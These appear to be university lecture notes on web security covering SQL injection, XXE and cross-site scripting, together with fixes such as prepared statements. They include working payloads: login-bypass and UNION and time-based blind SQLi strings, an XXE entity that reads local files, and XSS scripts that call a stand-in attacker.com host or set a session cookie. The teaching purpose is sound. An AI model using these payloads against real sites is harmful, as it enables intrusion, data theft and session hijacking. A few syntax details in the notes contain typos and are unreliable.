# Web 1 Slides: SQLi, XSS, XXE

## Common Web Bugs
Most web bugs stem from one of just a few issues:
* SQLi
* XSS
* CSRF
* File Inclusion
* Command Injection
* ...etc
These are summarized in the OWASP Top 10
## SQL Injection (SQLi)
### SQL Introduction
SQL?
* Language used to talk with databases
* Human readable
	* Literally query strings sent to the server
* Used everywhere
* Like, any website that stores data

Different servers implement slightly different dialects
* MySQL is most common
	* This is what we'll foucus on
* Core functionality is defined in *SQL-99*

* 3 Basic "tiers" for structuring data
	* Database
	* Table
	* Column
* Very similar to Excel
* Each data row has a value for each collumn (possibly `NULL`)
###### Ex SQL Statement:
```sql
SELECT, id, name, password FROM users WHERE name LIKE 'nick%';
```

This gets the `id`, `name`, and `password`, for each row where the `name` column value starts with "nick"
* `LIKE` statements use `%` as a wildcard
#### Statements
* Case sensitive by default
	* Capitalization of things like `SELECT`, `FROM`, `WHERE`, ...etc don't matter
* Strings are enclosed with single quotes
	* Quotes inside of the string are escaped with backslashes

* SQL statements are usually performed in the context of a specific DB
	* Set at connect time or with a `USE db_name` statement
* Queries can access all databases the connecting user has access to
	Ex: `SELECT username FROM cs3284_Demos.users WHERE id = 1;`
#### `SELECT` Statements
Ex: `SELECT 1, 2;`
* `SELECT`s can also select constants or functions
* There are also built-in functions which can be `SELECT`ed from
	* `VERSION()`
	* `DATABASE()`
	* `SLEEP(N)`
	* ...etc
#### Subqueries
Ex: `SELECT name, password FROM users WHERE id IN (SELECT id FROM banned);`
* Subqueries select all entries from the `banned` table's `id` column
* Then it uses that to filter which results are returned from `users`
#### Other Statements
```sql
INSERT INTO {table} [col1, col2, ...)] VALUES (1, 2, ...)[, (3, 4, ...)]
```
* Adds one or more new rows to the table

```sql
UPDATE {table} SET col1=1 [, col2=2, ...] WHERE col3='foo';`
```
* Changes data in all rows where the `WHERE` clause matches
#### Misc Items:
* The semicolon at the end is optional right now
	* Is required when using the CLI
* Comments:
	`SELECT 1, 2 --` will select 1 and 2
* SQL is human-readable on the wire

Parameters (ex: `'nick%'`) can be either *embedded* or *parameterized*
* *Embedded* means that the string is literally in the query
	* This is less common but still seen
* *Parameterization* means that there are placeholders in the query and the arguments are sent seperately
	* This is greatly preferred nowadays, and is how all ARM (?) based systems work
### What is wrong with this statement?
```sql
SELECT * FROM users WHERE name = '$name'
```

What happens if the value of `$name` is controlled by the user?

### SQL Injection
#### Example 1
```sql
SELECT * FROM users WHERE name = '$name'
```

If the user sets `$name` as "`foo'bar`"
* This is what the query looks like
```sql
SELECT * FROM users WHERE name = 'foo'bar;
```
* `bar` is now outside of the string
	* This will cause a syntax error
	* But we could make it evil...
#### Example 2
```sql
SELECT * FROM users WHERE name = '$name' AND password = '$password';
```
Assume
* `users` is a table with the following columns:
	* `id`
	* `name`
	* `password`
* We want to log in as admin
	So `name = 'admin'`
* We don't have the password
	* So what do we do...
##### Solution 1: Set `password` to a query
password = "`asdf' OR name = 'admin'`"

This is what the query looks like then:
```sql
SELECT * FROM users WHERE name = '$name' AND password = 'asdf' OR name = 'admin'
```
Look, it's a nice syntax-error-free piece of SQL!
##### Solution 2: Comment shit out in `name`
name = "`admin' --`"

Query:
```sql
SELECT * FROM users WHERE name = 'admin' -- AND password = '$password';
```
Yay, another valid SQL query

### Fixing SQL Injection
#### Obvious Solution: Escape the Quotes
`TRANSFORM ' INTO \'`
* lets the SQL server know that the single quote is part of the string, not a close quote
Syntax: `$name.replace("'", "\'")`
##### But we can get around that:
1) name = "`\'`"
2) name = `$name.replace("'", "\'")`
3) name = "`\\'"
	The `\` cancel each other out
#### `mysql_escape_string()`
`mysql_escape_string()` escapes `'`, `\`, ...etc
* Databases can specify their character encoding
	Ex:
	* ASCII
	* UTF-8
	* Shift JIS
	* ...etc
* Different encodings may represent the same byte sequence as different text
	Ex: `0x5c` is a `\` in ASCII but a `￥` in Shift JIS
#### `mysql_real_escape_string`
* This was created to fix the encoding bypass issue
* Takes two inputs
	* Handle to the DB so that it can check encoding
	* The string to escape
This prevents most bypassess...
##### Except:
```sql
SELECT * FROM users WHERE id = $id;
```
If our value is at the end of the query
* We don't have to worry about escaping things
`$id` = "`0 OR ...`"

The solution here is for them to do something like `intval($id)` to make it just a number
* lots of devs miss this

### SQLi ++
So... we have a SQLi... now what

What if we want to exfiltrate data (like user creds)?
* How can we `SELECT` out arbitrary data
#### `UNION` Statements
`UNION`s allow you to `UNION` the results of 2 queries
* Honestly, `UNION` functionality is rarely used in non-SQLi contexts

Main constraint: The number of columns have to match
* How can we figure this out (without source code)?
	Brute force the number based on the response code!
#### Example: Finding the Number of Columns with `UNION`
```sql
SELECT id, name FROM ... UNION SELECT 1
```

Look for a syntax error
* Will likely be in the form of a `HTTP 500` error from the web server
Keep trying different numbers of columns
* Eventually, a number should work
* Usually ~15 is the most columns you'll see

#### Example: Getting Version Number with `UNION`
```sql
SELECT * FROM users WHERE id = $id;
```
Assume:
* The `users` table has 3 columns:
	1) `id`
	2) `name`
	3) `password`
* The `name` value is returned on the page
* We want to leak the MySQL server's version

So what do we want to set `$id` to?
	`$id` = "`0 UNION SELECT 1, VERSION(), 3`"
Query now looks like:
```sql
SELECT * FROM users WHERE id = 0 UNION SELECT 1, VERSION(), 3;
```

The name field should now be the MySQL server version
#### Example
```sql
INSERT INTO users (username, fullname, password) VALUES ('$username', '$fullname', '$pass');
```

Assume:
* This is a registration page
* The `username` parameter is vulnerable
* The user is saved into the DB when registration is successful

`INSERT`s can't return data
* sometimes they can but they can't for our purpose here

We can use *subqueries* inside the `INSERT`
	`$username` = "`sum_user', (SELECT VERSION()), 'password') --`"
* Note: the inner `SELECT` isn't needed but it makes it easier to see the arbitrary query capability

Full query is now:
```sql
INSERT INTO users (username, fullname, password) VALUES ('sum_user', (SELECT VERSION()), 'password') --', '$fullname', '$pass');
```

So now, when the user looks at their full name, the SQL server version will be there
* This same principle can also be applied with `UPDATE`s
## Advanced SQLi
### Exfiltrating Data
#### First Goal: Orient Ourselves
* Where are we? What are the table schemas?
* `DATABASE()`
#### Now, what databases/tables/columns can we access?
Can get a lot of information from the `information_schema` database
* `information_schema.SCHEMATA`
	Performs: `SELECT SCHEMA_NAME`
* `information_schema.TABLES`
	Performs: `SELECT TABLE_NAME WHERE TABLE_SCHEMA = '...'`
* `information_schema.COLUMNS`
	Performs: `SELECT COLUMNA_NAME WHERE TABLE_SCHEMA = '...' AND TABLE_NAME = '...'`
#### Iterating Over DB/Table/Columns
The odds are good that there are more than 1 DB, table, column, ...etc
* Iterate through them using `LIMIT 1 OFFSET n`
Ex:
```sql
SELECT TABLE_NAME WHERE TABLE_SCHEMA = '...' LIMIT 1 OFFSET 0
SELECT TABLE_NAME WHERE TABLE_SCHEMA = '...' LIMIT 1 OFFSET 1
SELECT TABLE_NAME WHERE TABLE_SCHEMA = '...' LIMIT 1 OFFSET 2
...etc
```
#### Optimization: Concatenate into 1 String
Concatenate data to return as 1 string using `GROUP_CONCAT()`
```sql
GROUP_CONCAT(TABLE_NAME SEPARATOR ',')
```
* This returns a string wiht all the names concatenated with a `,`
### Blind SQLi
This is when we don't get any data back
* Np immediate errors
* No return data
* No `UPDATE`/`INSERT` injection
* ...etc
We do get some metadata back:
* Timing
* Server error codes
So to test for injection:
* Use `SLEEP()` to test timing to see if command runs
* Return bad data causing a `500` error
#### Time-Based Blind SQLi
Brute forcing shit character by character

This will evaluate an expression
* Returns 2nd arg if expression is true
* Returns 3rd arg if fales
```sql
IF(expr, val_if_true, val_if_false)
```

This expression extracts a substring from a string
* starts at position at int `start`
* Extracts `len` number of characters
```sql
SUBSTR(str, start, len)
```

So, if we want to go char by char, we can iterate through this statement:
```sql
SELECT IF(SUBSTR(name, 1, 1) = 'A', SLEEP(1), 0);
```

##### Optimization: Binary search on each character we want to extract
Use `ASCII(char)` to get the equivalent ASCII character code for a character
* basically the same as Python's `ord()`
```sql
IF(ASCII(SUBSTR(name, 0, 1)) < 0x40, SLEEP(1), 0)
```

### Second-Order SQLi
When the *"first layer"* properly escapes/parameterizes but there's a *"second layer"* that gets that data but does not escape it properly
#### Example Scenario: Online Shopping
**First Layer**: Ordering
```sql
INSERT INTO orders ...
```
**Second Layer**: Nightly Batch Processing
```SQL
SELECT address FROM orders
INSERT INTO shipping_labels VALUES ('$addresses', ...)
```

### Fixing SQLi Properly - Prepared Queries
Use Prepared Queries
* these are SQL statements with placeholders
* They understand what parts are input vs what parts are the command
	* Therefore separating the input from the syntax of the SQL statement

`$stmt` = `$conn->prepare("INSERT INTO MyGuests (firstname, lastname, email) VALUES (?, ?, ?)");`
* `$stmt -> bind_param("sss", $firstname, $lastname, $email);`
* `$firstname = "John”;`
* `$lastname = "Doe”;`
* `$email = john@example.com;`
* `$stmt->execute();`

## XML eXternal Entity (XXE)
* XXE = XML eXternal Entity (Attacks)
* It turns out, XML is overcomplex
	* XSLT (Extensible Stylesheet Language Transformations) is Turing-Complete
	* Folks have written formal programming languages based on XML
### XML 101
* XML is a tree of tags
* Tags have attributes and inner data/children
**Ex**:
```xml
<html>
	<body>
		<p style="font-size: 10px">Hello</p>
	</body>
</html>
```
#### XML Entities
XML entities are essentially placeholders
* Commonly see `&amp;`, `&gt;`, `&lt;`, ...etc in HTML
	* Those will be replaced with "&", ">", and "<" respectively
* They're defined with:
	* `<!ENTITY name value>` inside of a `<!DOCTYPE [...]>`

You can even include other files in entities:
```xml
<!ENTITY foo SYSTEM "file://file.txt">
<p>&foo;</p>
```
* Everything spins out of control for here
	* Try to access local sensitive files (ex: `/etc/shadow`)
	* Use remote files for code execution
	* ...etc
## Cross-Site Scripting (XSS)
### ...but first, Cookies
Cookies:
* Set by the server
	* In the `Set-Cookie` header
* Used to identify individual users to the server
* Can be implemented in multiple ways
	* PHP: Session ID corresponding to data saved server-side
	* Python/Flask: Encoded and MACd with actual data that the server wants to store
* Cookies are sent with **every** HTTP request for the domain that they correspond to

Cookie Parameters:
* Value (duh)
* Domain
	* Can be all subdomains
* Expiration Time
* Some flags (We care about 2)
	1) `secure`: This flag indicates that the cookie can only be sent by the browser when using SSL/TLS (HTTPS)
	2) `HTTPOnly`: This flag indicates that the cookie cannot be seen from the JS
### Intro to XSS
XSS == "Cross Site Scripting"
* Basically just JavaScript injection
* Useful in a number of ways
	* Cookie stealing
		* Also privesc
	* Performing actions on behalf of the "recipient" of the XSS
		* Basically doing anything that they/their browser could do by sending requests w/in the context of that user
### XSS Types
#### Reflected
In these cases, injection occurs directly in a `GET`/`POST` request
Ex:
```js
echo "<p>Hello $name</p>"
$name = <script>alert(1)</script>
```
#### Persistent/Stored
* Injected content is stored in a DB
* This is generally more dangerous
### XSS Testing
In all fields, have a small script that uses a `GET`back to a server with a unique ID corresponding to the field it came from
Ex: Submit the following code for each parameter
```js
name: <script>jQuery.get('http://attacker.com/1');</script>
message: <script>jQuery.get('http://attacker.com/2');</script>
```
### Performing Actions
The simplest thing to do is call a function that already exists to do something you want
* Eg: Reflected XSS to send a request to admin functionality that marks another account as an attacker

Look for operations that already exist during normal website use
* Otherwise, manually construct HTTP requests to hit certain endpoints
### Cookie Exfiltration
This will allow us to get cookies to access restricted functionality
* Send a request to an attacker controlled/accessible server with cookies in the URL or POST data
### XSS Mitigations
If only it were as simple as just filtering out `<script`
* Browser "XSS auditors"
	* Generally not a thing
	* Persistent injection bypasses
	* Possible to get around
* `HttpOnly` property
* Tie cookies to other non-changeable parts of the request
	* User Agent
	* IP
#### Mitigation Evasion
Other elements have ways to execute JavaScript
* The most common technique is with an img
```html
<img src = "doesnotexist.jpg" onerror="javascript:alert(1)" />
```
#### XSS in CTFs
Almost all scenarios are sending a message to an admin for approval
* XSS in the supplied name, email, message, ..etc
* Steal cookies to pivot to admin's account
* Commonly uses Phantom JS
* YES, this is what the homework is

## Similar Attacks - Session Fixation
In some languages (like PHP), the cookie is just an ID
* If we can inject JS before the login, we can set the cookie ID to a known value
* The user will log in, and we'll know what the ID they used is
###### Ex: Website home pages has XSS
Inject the following string
```html
<script>document.cookie = "PHPSESSID=foobar;"</script>
```
1) User logs in
2) Attacker can browse to that site
	With `PHPSESSID`=`foobar`
	Now they have become that user

## Other bad ideas for cookies:
* Store crypto secrets
* Store serialized data
* Storing user info
* Storing account state info
* Basically, anything other than a random long string is probably a bad idea